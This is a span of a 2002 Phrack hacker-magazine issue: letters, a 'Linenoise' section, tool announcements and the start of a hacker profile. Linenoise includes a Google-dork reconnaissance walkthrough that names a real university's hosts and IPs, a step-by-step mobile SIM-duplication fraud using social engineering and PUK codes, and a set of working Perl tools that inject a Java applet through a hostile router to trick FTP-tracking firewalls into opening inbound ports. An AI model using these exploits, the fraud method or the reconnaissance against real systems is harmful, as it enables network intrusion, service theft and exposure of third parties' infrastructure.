and uh..  don&#039;t find out where i live..  cos that&#039;s.. scary..  O.o;;

adios
~0513~

|=[ 0x0c ]=--------------------------------------------------------------=|

From: anthony charles &lt;bemoeasy@yahoo.com&gt;
Subject: EAGER STUDENT

Dear editor,

i was directed by somebody i met online that i should
contact your mag about being a hacker.I&#039;m resident in
Nigeria,West Africa. i would be very grateful if you
can assist me because it has been my dream to be a
hacker.

The users in the hackers lounge in yahoo chat are too
fast for me. i need to learn the rudiments of becoming
a hacker.Every start&#039;s somewhere...this is where i
start if you would honor me by imparting knwledge to
an eager student.

Awaiting your reply.
yours sincerely
Anthony Charles

    [ no comment ]

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                            ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x03 of 0x10

|=-----------------------=[ L I N E N O I S E ]=-------------------------=|
|=-----------------------------------------------------------------------=|
|=-------------------------=[ Phrack Staff ]=----------------------------=|


--[ Contents

  1 - The Dark Side of NTFS
  2 - Watching Big Brother
  3 - Free mobile calls
  4 - Lawfully Authorized Electronic Surveillance [LAES]
  5 - Java Tears down the Firewall

--[ 1 - The Dark Side of NTFS

Ok, this didnt fit anywhere else so we put it here:

http://patriot.net/~carvdawg/docs/dark_side.html

--[ 2 - Watching Big Brother

        by da_knight &lt;x667576616a6e@yahoo.com&gt;


    Have you ever wanted to be the one doing the watching? If you are a
system administrator of UNIX / Linux servers, then you may be aware of a
product called Big Brother, which can be downloaded from &#039;http://bb4.com/&#039;.
This article is by no means technical, simply because it doesn&#039;t need to
be. It is divided into two sections, so bear with me for the briefing on
Big Brother (BB).

    BB is a program that will monitor various computer equipment; things it
can monitor are connectivity, cpu utilization, disk usage, ftp status, http
status, pop3 status, etc. As you might imagine, this information is very
important to an organization. BB is your standard client / server setup.
The server software can run on various flavors of UNIX, Linux and NT. The
client software is available for UNIX, Linux, NT, Mac, Novell, AS/400, and
VAXEN; some client software is provided by 3rd-party vendors and not
supported by BB4 Technologies.

    The cool thing about this is all of this information is viewed on a web
page. So, if you have multiple servers that you have to maintain, with this
product you would be able to go to one web page and quickly get a status of
all of those servers - pretty handy. When everything is fine your status is
&quot;green&quot;, major problems are indicated by &quot;red&quot;.

    Example: The connectivity (conn) status is done by pinging the
equipment in question; if the ping fails then it would appear as a red zit
on the web page. When tests such as this fail, BB can be configured to
automatically page the administrator.

Here is a quick run down of the statuses, listed in order of severity:

red    - Trouble; you&#039;ve got problems.
purple - No report; the client hasn&#039;t responded in the last 30 minutes.
yellow - Attention; a threshold has been crossed.
green  - OK; take the day off.
clear  - Unavailable; the test has been turned off.
blue   - Disabled; notification for this test has been turned off.

    The status is also reflected in the title of the web page, so it only
takes one red zit to cause the web page title to start with &quot;red:Big
Brother&quot;; we&#039;re going to get into this in a minute.

    A common thing for administrators to do is to monitor their most
important systems with this product, as well as the most important aspects
of each system. If you have a web server, you would want to monitor the
http and conn statuses just to make sure people are still able to connect
to the server. Other tests I have seen are to check Oracle, or to list all
connected users. Hell, they even have a way to add weather reports. The
point is, it&#039;s pretty limitless what can be monitored, it just depends on
what you deem important.

    Now that you have a little bit of an understanding what BB can do, I
want to quote two things from BB4 Technologies (BB4) FAQ - Section 5:
Security Considerations (http://bb4.com/bb/help/bb-faq.html#5.0).
Everything in that section of the FAQ should be considered, but we&#039;ll focus
on these two.

    &quot;BB does not need to run as root. We suggest creating a user &#039;bb&#039; and
running bb as that user.&quot; &quot;We recommend password-protecting the Big Brother
web pages&quot;

    So, you ask yourself, why are these things important to me? Well, one,
you know that administrators who run this software probably have it setup
using the user &#039;bb&#039;, and that they may also be running it with root level
access. This gives you a valid user account on a system and this account
probably wouldn&#039;t be used by a human very often so the password could be
something simple. But that&#039;s not the point of this article. The second
thing is that BB4 realizes the information on these web pages is extremely
important and they recommend password-protecting them.

    Following this logic you then say these are web pages, so it&#039;s running
on a web server and if they&#039;re not password-protected and the server is
visible to the WWW, then...that&#039;s right search engines will find these
pages and serve them up when you know what to look for.

    What are you waiting for? Go to &#039;http://www.google.com&#039; and search for
&quot;green:Big Brother&quot; (include the quotes; it makes it more refined). You
will get about 16,200 matches. Now that doesn&#039;t mean that those are all
unique because it will have numerous pages from the same site, but you get
the point. I would estimate that there are over 200 sites that can be
viewed this way. Remember to search for all the other statuses too, just
change the name of the color. One more thing, I chose Google for a reason.
Some of these sites no longer run the BB product, but Google has a nice
ability to view cached pages, so you can still glean information from them.

    After you scroll through the list of sites you will realize that the
majority of them are either small ISP&#039;s or colleges. I&#039;m going to pick on a
college, an Ivy League one, no less. I can tell you from looking at this
particular BB site that the BB server is running on a computer called
&#039;artemis.cs.yale.edu&#039; and the IP address is &#039;128.36.232.57&#039;. Also the
computer &#039;rhino.zoo.cs.yale.edu&#039; is having some serious issues. How did I
find the IP address? Simple; if you click on the &quot;green&quot; or whatever color
button under the &quot;conn&quot; column, you will see a web page that has
information similar to this:

---------------------------------------------------------

rhino.zoo.cs.yale.edu - conn

---------------------------------------------------------
 
green Sun Jun 30 01:33:15 EDT 2002 Connection OK  PING 128.36.232.12
(128.36.232.12) from 128.36.232.57 : 56(84) bytes of data. 64 bytes
from 128.36.232.12: icmp_seq=0 ttl=255 time=379 usec

--- 128.36.232.12 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss round-trip
min/avg/max/mdev = 0.379/0.379/0.379/0.000 ms

---------------------------------------------------------

    Right there you know that the ping command was trying to ping
&#039;128.36.232.12&#039;, in this case, &#039;rhino.zoo.cs.yale.edu&#039; and that it came
from &#039;128.36.232.57&#039; or &#039;artemis.cs.yale.edu&#039;. Let&#039;s see what else we can
find out.

    I can see that almost all of their servers run Tripwire, so they are
UNIX systems, and you probably would have a hard time creating a backdoor
account on these systems. On another page, we get to see the users who are
currently logged in. Currently we have 33 users logged in, and seeing as
it&#039;s 1:33 AM, I think some people left their computers logged in.

    I want to get more information about Yale&#039;s servers, so let&#039;s go back
to Google and look for another page from Yale, but this time look for
&#039;zelda.cs.yale.edu&#039;. Now we can get some good information. When this site
is displayed you will see quite a few servers, listed as well as several
departments. If you want to know what software &#039;plucky.cs.yale.edu&#039; is
using to run it&#039;s HTTP services just click on the &#039;green&#039; button:

----------------------------------------------------

plucky.cs.yale.edu - http

----------------------------------------------------
 
green Sun Jun 30 01:45:21 EDT 2002 


 http://plucky.cs.yale.edu - Server OK
HTTP/1.1 200 OK
Server: Microsoft-IIS/4.0
Content-Location: http://plucky.cs.yale.edu/index.html Date: Sun, 30
Jun 2002 05:45:21 GMT
Content-Type: text/html
Accept-Ranges: bytes
Last-Modified: Tue, 12 Jan 1999 20:49:40 GMT ETag:
&quot;54b4ec126d3ebe1:4051&quot;
Content-Length: 2226


Seconds: 0.01 

----------------------------------------------------

    What the hell? They&#039;re actually running IIS 4.0? Don&#039;t they know how
insecure that is? But I digress. From that information you know that the
server is some version of Windows NT and it has IIS 4.0 running, that could
be handy.

    Zelda is also showing they monitor printers. Now that can be fun; what
if the message &quot;I think therefore I hack!&quot; is sent to the printer
&#039;philo-printer.philosophy.yale.edu&#039;? And in case you&#039;re wondering, the
printer is an &#039;HP LaserJet 4050 Series&#039;; I just had to click on the button
under the &quot;printer&quot; column to find that out.

    Elsewhere on this same site, I find that several servers are running
TELNET, POP3, Oracle, FTP, and IMAP. Most of these services will gladly
tell you what version of the software they are running. Oracle, for
instance, is even nice enough to show you all of the connected users. How
can you thank them enough for this valuable information?

    Also, it seems only the geologists at Yale feel they have data that is
of great importance. I wasn&#039;t able to view what they monitor because of
access permissions on their web site, but I do know that they are running
their web server on Apache version 1.3.26.

    As you can see, I would be able to gather an enormous amount of vital
infrastructure data in a few minutes. Plus, I didn&#039;t break any laws. These
web pages are posted in a manner that the entire world can view them. It
might take someone 10 minutes or more to find out a few facts about 1
particular system, but in that amount of time I found numerous facts about
over 40 systems at the same organization. Thanks Big Brother!

    I feel it should be mentioned that the information found on these web
pages is information that most organizations don&#039;t even let employees
outside of the IT department see. I guess I should feel special since Yale
must feel that I&#039;m not a security risk, otherwise they would have made me
authenticate to their web sites.

    Imagine this; an ISP that lists all of their routers complete with IP&#039;s
and model information. If you had that, you could possibly rely on
vulnerabilities in SNMP discovered earlier this year, or better yet, rely
on the default accounts / passwords setup on these types of devices. I only
bring this up because I know I did come across an ISP that did list routers
and the majority of the sites returned by Google seemed to be smaller ISPs.

    Also, about searching on Google, I would recommend searching for
&quot;red:Big Brother&quot;, because these pages will always give you more
information than when the system is running perfectly.

    Finally, I didn&#039;t write this article to condone breaking into systems
and providing a means to that end. I wrote this because security is
extremely important; with the information that is found because of this one
product your environment could be compromised. If you are a system
administrator for a site that shows up on Google you may want to secure
your BB web pages, because by the time you read this the world is going to
know your infrastructure.

--[ 3 - Free Mobile Calls

        by eurinomo

This bug can be utilized to make FREE CALS, FREE SMS, and even FREE 
WAP.

    1st you have to see if you mobile network has the bug. Just call the
service free number (to don&#039;t waste money) and say to them that you card
is locked that you forgot your fone in your litle syster&#039;s room and your
mobile says &quot;Sim Card is lock&quot; or something, say that maybe yor sister have
wronged the puk because the phone was powered off and now it&#039;s on. Then the
guy must say that you have to go to one of theyr Mobile Shops and say the
problem and they will give you another card with the same number and money
as the old. Ask them how much it will cost and the guy must say it&#039;s for
free! :-)

Now the Matirial that youl need:
- A mobile phone not nokia (it&#039;s better to be yours and not unlocked)
- And a nokia(can be a unlocked 1 or steled or borrowed. Do as you wish!)

How to do it:

Mobile1 = Not nokia
Mobile2 = Nokia

Put the card in the mobile1 and enter your pin. When it booted up put this
code 3 times:
**04*00000000*00000000*00000000#
or try
**05*00000000*00000000*00000000#

    Check the manual and search for the code to change the puk if the above
examples dont work. Or give a email to motorola and say that you have a
motorola phone and that you want to change the puk and you know that is a
code to change (the code isn&#039;t ilegal and it&#039;s also specified in the 
manual).

    If the code isnt the one that i have telled is 1 nerby. If you have a 
motorola flare when you put **04* or **05* it&#039;ill say &quot;Enter the old Puk&quot;
or something like that automatly and then ask the new puk code 2 times. But
the important is to lock your card, i think you can do it also if you wrong
the pin 3 times and then enter a wrong puk and vuala it&#039;s locked! But what i
was saing about the code it&#039;s was tested but you can try this last too, use
it in your on risk.

    Now goto the Mobile Shop and say what hapened (that your litle sister
or a doughter of an friend of your mother or something like that...) And
then they will dupicate the card and they will give you the new one and the
old one. At last they normaly give the 2.

    Now the easy part. Put the old card in the nokia and boot it up and you
see thats not locked!!! and if you put on anoher phone not nokia its says
that its locked, the Bug is a more nokia Bug that a network Bug. Now send a
SMS with the old card and see if disconted money. Then see if was disconted
from the new card if not than it&#039;s because the Network has the bug and you
can waste the money off the old card as you wish but you only have 2 weeks
or soo before they cut it out of the Network and it&#039;s completly lock, but
the new card stil have the same money and you can do it again and again
that i think they woldn&#039;t catch you.

This was tested in the Portugal Vodafone Mobile Phone Network.


--[ 4 - Introduction to Lawfully Authorized Electronic Surveillance (LAES)

           by Mystic &lt;mystic@lostways.net&gt;

In 1994 Congress adopted the Communications Assistance for Law Enforcement
Act (CALEA). It&#039;s intent was to preserve but not expand the wiretapping
capabilities of law enforcement agencies by requiring telecommunication
providers to utilize systems that would allow government agencies a basic
level of access for the purpose of surveillance. The act however does not
only preserve the already existing capabilities of law enforcement to tap
communications, it enhances them, allowing the government to collect
information about wireless callers, tap wireless content, text messing, and
packet communications. The standard that resulted from this legislation is
called Lawfully Authorized Electronic Surveillance or LAES.


A Telecommunications Service Provider (TSP) that is CALEA compliant
provides means to access the fallowing services and information to Law
Enforcement Agencies (LEAs):

1. Non-call associated: Information about the intercept subjects that is
   not necessarily related to a call.

2. Call associated: call-identifying information about calls involving the
   intercept subjects.

3. Call associated and Non-call associated signaling information: Signaling
   information initiated by the subject or the network

4. Content surveillance: the ability to monitor the subjects&#039;
   communications. 

This process is called the intercept function. The intercept function is
made up of 5 separate functions: access, delivery, collection, service
provider administration, and law enforcement administration.    


----[ 4.1  The Access Function (AF)


    The AF consists of one or more Intercept Access Points (IAPs) that
isolate the subject&#039;s communications or call-identifying information
unobtrusively. There are several different IAPs that can be utilized in
the intercept function. I have separated them into Call Associated and
Non-call Associated information IAPs and Content Surveillance IAPs:

Call Associated and Non-call Associated information IAPs
--------------------------------------------------------

- Serving System IAP (SSIAP): gives non-call associated information.

- Call-Identifying Information IAP (IDIAP): gives call associated
  information and in the form of the fallowing call events for basic
  circuit calls:

  Answer      - A party has answered a call attempt
  Change      - The identity or identities of a call has changed
  Origination - The system has routed a call dialed by the subject or the
                system has translated a number for the subject
  Redirection - A call has been redirected (e.g., forwarded,
                diverted, or deflected)
  Release     - The facilities for the entire call have
	        been released TerminationAttempt - A call attempt to an
	        intercept subject has been detected

- Intercept Subject Signaling IAP (ISSIAP): provides access to
  subject-initiated dialing and signaling information. This includes if the
  intercept subject uses call forwarding, call waiting, call hold, or
  three-way calling. It also gives the LEA the ability to receive the
  digits dialed by the subject.

- Network Signaling IAP (NSIAP): Allows the LEA to be informed about
  network messages that are sent to the intercept subject. These messages
  include busy, reorder, ringing, alerting, message waiting tone or visual
  indication, call waiting, calling or redirection name/number information,
  and displayed text.

Content Surveillance IAPs
-------------------------

   The fallowing are content surveillance IAPs that transmit content using
a CCC or CDC. An interesting note about content surveillance is that
TSPs are not responsible for decrypting information that is encrypted by
the intercept subject unless the data was encrypted by the TSP and the
TSP has the means to decrypt it. 

- Circuit IAP (CIAP): accesses call content of circuit-mode communications. 

- Conference Circuit IAP (CCIAP): Provides access to the content of
  subject-initiated Conference Call services such as three-way calling and
  multi-way calling.

- Packet Data IAP (PDIAP): Provides access to data packets sent or received
  by the intercept subject.
  
 These include the fallowing services:

 ISDN user-to-user signaling
 ISND D-channel X.25 packet services
 Short Message Services (SMS) for cellular and Personal Communication Services
 Wireless packet-mode data services (e.g., Cellular Digital Packet Data
        (CDPD), CDMA,  TDMA, PCS1900, or GSM-based packet-mode data  services)
 X.25 services
 TCP/IP services
 Paging (one-way or two-way)
 Packet-mode data services using traffic channels

----[ 4.2  The Delivery Function (DF)

   The DF is responsible for delivering intercepted communications to one
or more Collection Functions. This is done over two distinct types of
channels: Call Content Channels (CCCs) and Call Data Channels (CDCs).
The CCCs are generally used to transport call content such as voice or
data communications. CCCs are either &quot;combined&quot; meaning that they carry
transmit and receive paths on the same channel, or &quot;separated&quot; meaning
that transmit and receive paths are carried on separate channels. The
CDCs are generally used to transport messages which report
which is text based such as Short Message Service (SMS). Information
over CDCs is transmitted using a protocol called the Lawfully Authorized
Electronic Surveillance Protocol (LAESP).

----[ 4.3  The Collection Function (CF)

   The CF is responsible for collecting and analyzing intercepted
communications and call-identifying information and is the
responsibility of the LEA.

----[ 4.4  The Service Provider Administration Function (SPAF)

   The SPAF is responsible for controlling the TSP&#039;s Access and Delivery Functions.

----[ 4.5  The Law Enforcement Administration Function (LEAF)

   The LEAF is responsible for controlling the LEA&#039;s Collection Function
and is the responsibility of the LEA.

   Now that I&#039;ve introduced you to LAES lets look at an implementation of
it that is on the market right now and is being used by some TSPs:

Overview of the CALEAserver:

   The CALEAserver is manufactured by SS8 Networks. It is a collection and
delivery system for call information and content. It allows existing
networks to become completely CALEA compliant. It allows for a LEA to
monitor wireless and wire line communications and gather information about
the calls remotely. The CALEAserver interfaces with the network through
Signaling System 7 (SS7) which is an extension of the Public Switched
Telephone Network (PSTN). The CALEAserver is composed of three major
layers: the Hardware Platform Layer, the Network Platform Layer and the
Application Software Layer.

    The Hardware Platform Layer consists of the Switching Matrix and the
Computing Platform. The Switching Matrix is an industry standard
programmable switch. It contains T1 cards for voice transmission and cross
connect between switches, DSP cards for the conference circuits required
for the intercept and DTMF reception/generation, and CPU cards for
management of the switch. The Computing Platform is a simplex, rack
mounted, UNIX based machine. It is used to run the CALEAserver application
software that provides Delivery Function capabilities and controls the
Switching Matrix.

   The Network Platform Layer provides SS7 capability, as well as, call
processing APIs for the Application Software Layer. It also controls the
Switching Matrix.

   The Application Software Layer is where the Delivery and Service Provider
Administration functions are carried out. It isolates the interfaces
towards the Access and Collection Functions from the main delivery
functionality allowing for multiple Access and Collection Functions through
the Interface Modules that can be added or modified without impacting the
existing functionality.

System Capacity:

Configurable for up to: 

1000 Collection functions 
128 Access Function Interfaces 
32 SS7 links 
512 simultaneous call content intercepts on a single call basis 
64 T1 voice facilities 

Operating Environment: 

NEBS compliant, -48 volt, 19&quot; rack mounted equipment 
Next-generation UltraSPARC processor 
66-MHz PCIbus 
Solaris UNIX operating system 
9Gbyte, 40-MB/sec SCSI disks 
512 Mbytes RAM standard 
Ethernet/Fast Ethernet, 10-BaseT and 100-BaseT 
Two RS-232C/RS-423 serial ports 
Programmable, scalable switch with up to 4000 port time slot interchange

Features: 

Built in test tools for remote testing 
Full SS7 management system 
Alarm reporting and Error logging 
Automatic software fault recovery 
Automatic or manual disk backup 
SNMP support 
Optional support for X.25 and other collection function interfaces 
ITU standard MML and Java based GUI support 
Support of both circuit-switched and packet-switched networks 
Optional support for other access function interfaces as required for
         CALEA compliance, including: 
 *HLR (Home Location Register) 
 *VMS (Voice Mail System) 
 *SMS (Short Message System) 
 *CDPD wireless data 
 *Authentication Center 
 *Remote access provisioning 


   This concludes the introduction to LAES. This being only an introduction,
I&#039;ve left out allot of details like protocol information. However, if you
are interested it learning more about LAES I would suggest reading the TIA
standard J-STD-025A. I hope you learned a little bit more about the
surveillance capabilities of LEAs. If you have any questions feel free to
contact me. Email address: see above.


--[ 5 - Java tears down the Firewall


Recently there has been much hype about various
insecurities in firewalls which support tracking of FTP sessions.
They could be tricked into thinking someone was opening an
FTP session by using a second TCP stack for example. I would
point you to CERT-URL for complete discussion.
There have been other techniques discussed such as embedding
some evil tags in HTML files which makes the browser opening
connections a firewall could interpret as FTP session.

Consider the following net:

[ Company ] ---- [ firewall ] --- [ some router ] --- [ WEB ]

Someone from &#039;Company&#039; is browsing the web and has to
pass his packets across some router that is not under control
by Company but by attacker. Very common scenario no?

A few tools have been compiled to circumvent such setup.
I would even say, as soon as you enable FTP tracking you are lost.
More than one way ends in Rome.

Let me explain the small tools in short.

html-redirect: Attacker installs this on some router and
sets up redirect rule to port 8888.

class-inject:  Attacker starts this with eftepe.class. html-redirect
will redirect the HTML requests to this mini-httpd. It forces
browser inside Company which is shielded by firewall to load
the Java applet. This applet simulates active FTP session to
some router and it is allowed so because security manager sees
some router as origin of eftepe.class. Firewall will then open
port 7350 inbound so you can connect from some router:20 to Company:7350.

ftpd: Attacker must run this on some router in order to simulate FTP
session.

createclass: script to create the correct java code which is
using apropriate IP (of some router) and port (on Company) then

Attacker could also sit on WEB (i.e. phrack.org :) and embed evil
java applets. So take care because X runs on port 6000. :-)

It is really that simple, and its not even worth an own article,
thats why you find it here as a add-on.

&lt;classinject&gt;
#!/usr/bin/perl -w

# Puts a classfile into remote browser
#

use IO::Socket;

sub usage
{
	print &quot;Usage: $0 &lt;class file&gt;\n\n&quot;;
	exit;
}

my $classfile = shift || usage();
my $class;
my $classlen = (stat($classfile))[7];
open I, &quot;&lt;$classfile&quot; or die $!;
read I, $class, $classlen;
close I;

my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,
                                     LocalPort =&gt; 8080,
                                     Reuse =&gt; 1) or die $!;
my $conn;

for (;;) {
	next unless $conn = $sock-&gt;accept();
	if (fork() &gt; 0) {
		$conn-&gt;close();
		next;
	}
	my $request = &lt;$conn&gt;;
	if ($request =~ /$classfile/) {
		my $classcontent = &quot;HTTP/1.0 200 OK\r\n&quot;.
		 &quot;Server: Apache/1.3.6 (Unix)\r\n&quot;.
		 &quot;Content-Length: $classlen\r\n&quot;.
		 &quot;Content-Type: application/octet-stream\r\n\r\n&quot;.$class;
		print $conn $classcontent;
		print &quot;Injected to &quot;, $conn-&gt;peerhost(), &quot;\n&quot;;
	} else {
		print $conn &quot;&lt;HTML&gt;&quot;.
		            &quot;&lt;APPLET CODE=\&quot;$classfile\&quot; WIDTH=1 HEIGHT=1&gt;&quot;.
		            &quot;&lt;/APPLET&gt;&lt;/HTML&gt;\r\n\r\n&quot;;
	}
	$conn-&gt;close();
	exit(0);
}
&lt;/classinject&gt;
&lt;createclass&gt;
#!/usr/bin/perl -w

$ENV{&quot;PATH&quot;} = $ENV{&quot;PATH&quot;}.&quot;/usr/lib/java/bin&quot;;

print &quot;Creating apropriate Java class-file for opeing port &gt; 1023\n&quot;;
print &quot;Enter IP to connect to on port 21 (e.g. &#039;127.0.0.1&#039;):&quot;;
my $ip = &lt;STDIN&gt;; chop($ip);
print &quot;Enter port to open:&quot;;
my $port = &lt;STDIN&gt;; chop($port);
my $p1 = int $port/256;
my $p2 = $port%256;

open O, &quot;&gt;eftepe.java&quot; or die $!;
print O&lt;&lt;EOF;

import java.io.*;
import java.applet.*;
import java.util.*;
import java.net.*;

public class eftepe extends Applet {

public void init()
{
	try {
		Socket s = new Socket(&quot;$ip&quot;, 21);
		OutputStream os = s.getOutputStream();
		BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
		PrintWriter pw = new PrintWriter(os, true);
		in.readLine();
		pw.println(&quot;USER ftp\\r\\n&quot;);
		in.readLine();
		pw.println(&quot;PASS ftp\\r\\n&quot;);
		in.readLine();
		String port = new String(&quot;PORT &quot;);
		String me = InetAddress.getLocalHost().getHostAddress();
		port += me.replace(&#039;.&#039;, &#039;,&#039;);
		port += &quot;,$p1,$p2\\r\\n&quot;;
		pw.println(port);
		for(;;);
	} catch (Exception e) {
		e.printStackTrace();
	}
}

}
EOF

print &quot;Compiling into classfile...\n&quot;;
system(&quot;javac eftepe.java&quot;);
print &quot;Done. Results are in eftepe.class\n&quot;;

&lt;/createclass&gt;

&lt;ftpd&gt;
#!/usr/bin/perl -w

use IO::Socket;

my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,
                                     LocalPort =&gt; 21,
                                     Reuse =&gt; 1) or die $!;
my $conn;

for (;;) {
	$conn = $sock-&gt;accept();
	if (fork() &gt; 0) {
		$conn-&gt;close();
		next;
	}
	print $conn &quot;220 ready\r\n&quot;;
	&lt;$conn&gt;;  # user
	print $conn &quot;331 Password please\r\n&quot;;
	&lt;$conn&gt;;  # pass
	print $conn &quot;230 Login successful\r\n&quot;;
	&lt;$conn&gt;;  #port
	print $conn &quot;200 PORT command successful.\r\n&quot;;
	sleep(36);
	$conn-&gt;close();
	exit 0;
}
&lt;/ftpd&gt;

&lt;html-redirect&gt;
#!/usr/bin/perl -w

# Simple HTTP Redirector
#

# iptables -A PREROUTING -t nat -p tcp --dport 80 -j REDIRECT --to-port 8888

use IO::Socket;

sub usage
{
	print &quot;Usage: $0 &lt;IP|Host&gt;\n&quot;.
	      &quot;\t\tIP|Host -- IP or Host to redirect HTML reuests to\n\n&quot;;
	exit;
}

my $r = shift || usage();
my $redir = &quot;HTTP/1.0 301 Moved Permanently\r\n&quot;.
            &quot;Location: http://$r:8080\r\n\r\n&quot;;

my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,
                                     LocalPort =&gt; 8888,
                                     Reuse =&gt; 1) or die $!;
my $conn;

for (;;) {
	next unless $conn = $sock-&gt;accept();
	if (fork() &gt; 0) {
		$conn-&gt;close();
		next;
	}
	my $request = &lt;$conn&gt;;
	print $conn &quot;$redir&quot;;
	$conn-&gt;close();
	exit(0);
}
&lt;/html-redirect&gt;

&lt;testconnect&gt;
#!/usr/bin/perl -w

use IO::Socket;

sub usage
{
	print &quot;Usage: $0 &lt;Host&gt; &lt;Port&gt;\r\n&quot;;
	exit 0;
}

my $a = shift || usage();
my $b = shift || usage();

my $conn = IO::Socket::INET-&gt;new(PeerAddr =&gt; $a,
                                 PeerPort =&gt; $b,
                                 LocalPort =&gt; 20,
                                 Type =&gt; SOCK_STREAM,
                                 Proto =&gt; &#039;tcp&#039;) or die $!;

print $conn &quot;GOTCHA\r\n&quot;;
$conn-&gt;close();
&lt;/testconnect&gt;

&lt;conntrack-start&gt;
#!/bin/sh

# sample FTP session tracked firewall for 2.4 linux kernels
# modprobe ip_conntrack_ftp

iptables -F

iptables -A INPUT -p tcp --sport 21 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --dport 21 -m state --state NEW,ESTABLISHED -j ACCEPT

iptables -A INPUT -p tcp --sport 20 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p tcp --dport 20 -m state --state ESTABLISHED -j ACCEPT

#iptables -A INPUT -p tcp --syn -j LOG
iptables -A INPUT -p tcp --syn -j DROP
&lt;/conntrack-start&gt;

|=[ EOF ]=---------------------------------------------------------------=|


--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x04 of 0x10

|=--------------------=[ T O O L Z   A R M O R Y ]=----------------------=|
|=-----------------------------------------------------------------------=|
|=---------=[ packetstorm &lt;http://www.packetstormsecurity.org&gt;  ]=-------=|


This new section, Phrack Toolz Armory, is dedicated to tool annoucements.
We will showcast selected tools of relevance to the computer underground
which have been released recently. The tools for #60 have been selected
in teamwork by the Packet Storm staff and Phrack staff.

Drop us a mail if you develop something that you think is worth of being
mentioned here.

   1 - nmap 3.1 Statistics Patch
   2 - thc-rut
   3 - Openwall GNU/*/Linux (Owl) 1.0
   4 - Stealth Kernel Patch
   5 - Memfetch
   6 - Lcrzoex
   
----[ 1 - NMAP 3.1 Statistics Patch

URL     : http://packetstormsecurity.org/UNIX/nmap/nmap-3.10ALPHA4_statistics-1.diff
Author  : vitek[at]ixsecurity.com 
Comment : The Nmap 3.10ALFA Statistics Patch adds the -c switch which
          guesses how much longer the scan will take, shows how many ports
          have been tested, resent, and the ports per second rate.  Useful
	  for scanning firewalled hosts.


----[ 2 - thc-rut

URL     : http://www.thehackerschoice.com/thc-rut
Author  : anonymous[at]segfault.net
Comment : RUT (aRe yoU There, pronouced as &#039;root&#039;) is your first knife on
          foreign network. It gathers informations from local and remote
          networks.
	  
          It offers a wide range of network discovery utilities
          like arp lookup on an IP range, spoofed DHCP request, RARP,
          BOOTP, ICMP-ping, ICMP address mask request, OS fingerprinting,
          high-speed host discovery, ...

          THC-RUT comes with a OS host Fingerprinter which determines the
	  remote OS by open/closed port characteristics, banner matching
	  and nmap fingerprinting techniques (T1, tcpoptions).

          The fingerprinter has been developerd to quickly (10mins)
          categorize hosts on a Class B network. Information sources are
          (amoung others) SNMP replies, telnetd (NVT) negotiation options,
          generic Banner Matching, HTTP-Server version, DCE request and
          tcp options. It is compatible to the nmap-os-fingerprints
          database and comes in addition to this with his own perl regex
          capable fingerprinting database (thcrut-os-fingerprints).


----[ 3 - Openwall GNU/*/Linux (Owl) 1.0 (Released 2002-10-13)

URL     : http://www.openwall.com/Owl
Author  : Solar Designer and other hackers.
Comment : Openwall Linux is the Hacker&#039;s choice platform. The security
          has been defined by people who know what they are doing. Owl
          comes without any useless services running by default, no RPM
          dependencies headache, full featured environment for
          developers, a large number of usefull tools and a BSD-port-like
          update mechanism. It&#039;s for people who prefer vi over
          click/drag-and-drop sickness to configure the system.

          Openwall GNU/*/Linux (Owl) includes a pre-built copy of John
          the Ripper password cracker ready for use without requiring
	  another OS (life system!) and without having to install on a
	  hard disk (although that is supported). The CD-booted system
	  is fully functional, you may even let it go multi-user with
	  virtual consoles and remote shell access.

          John the Ripper is a fast password cracker, currently
	  available for many flavors of Unix (11 are officially
          supported, not counting different architectures), DOS, Win32,
	  and BeOS. Its primary purpose is to detect weak Unix
	  passwords, but a number of other hash types are supported
	  aswell.

          This is probably the most secure linux distribution out there.


----[ 4 - Stealth Kernel Patch

URL     : http://packetstormsecurity.org/UNIX/patches/linux-2.2.22-stealth.diff.gz
Author  : Sean Trifero &lt;sean[at]innu.org&gt;
Comment : The Stealth Kernel Patch for Linux v2.2.22 makes the linux kernel
	  discard the packets that many OS detection tools use to query the
	  TCP/IP stack. Includes logging of the dropped query packets and
	  packets with bogus flags. Does a very good job of confusing nmap
	  and queso.


----[ 5 - Memfetch

URL     : http://packetstormsecurity.org/linux/security/memfetch.tgz
Author  : Michal Zalewski &lt;lcamtuf[at]ghettot.net&gt;
Comment : Memfetch dumps the memory of a program without disrupting its
	  operation, either immediately or on the nearest fault condition
	  (such as SIGSEGV). It can be used to examine suspicious or
	  misbehaving processes on your system, verify that processes are
          what they claim to be, and examine faulty applications using your
	  favorite data viewer so that you are not tied to the inferior
	  data inspection capabilities in your debugger.



----[ 6 - Lcrzoex

URL     : http://www.laurentconstantin.com/en/lcrzoex/
          http://www.laurentconstantin.com/en/rzobox/ (front end)
Author  : Laurent Constantin &lt;laurent.constantin@aql.fr&gt;
Comment : Lcrzoex contains over 400 tools to test an Ethernet/IP
          network. It runs under Linux, Windows, FreeBSD, OpenBSD and
	  Solaris. Features:

		  - sniff/spoof/replay
		  - syslog/ftp/dns/http/telnet clients
		  - ping/traceroute
		  - web spider
		  - tcp/web backdoor
		  - data conversion


|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


phrack.org:~# cat .bash_history

                            ==Phrack Inc.==

              Volume 0x0b, Issue 0x3c, Phile #0x05 of 0x10

|=--------------=[ P R O P H I L E   O N   H O R I Z O N ]=--------------=|
|=-----------------------------------------------------------------------=|
|=------------------------=[ Phrack Staff ]=-----------------------------=|


|=---=[ Specification

                  Handle: horizon
                     AKA: humble, john
           Handle origin: It sounded neat.
               catch him: I&#039;m very easy to find.
        Age of your body: mid 20s
             Produced in: USA
         Height &amp; Weight: 5&#039;11&quot; ~165 lbs.
                    Urlz: Nope
               Computers: A couple of decent x86 boxes and a lot of
                          older stuff..
               Member of: CostCo
                Projects: Currently, stuff for work, and a few personal
                          things that really aren&#039;t that interesting.

|=---=[ Favorite things

          Women: Creativity, intelligence, a sense of style.
           Cars: German
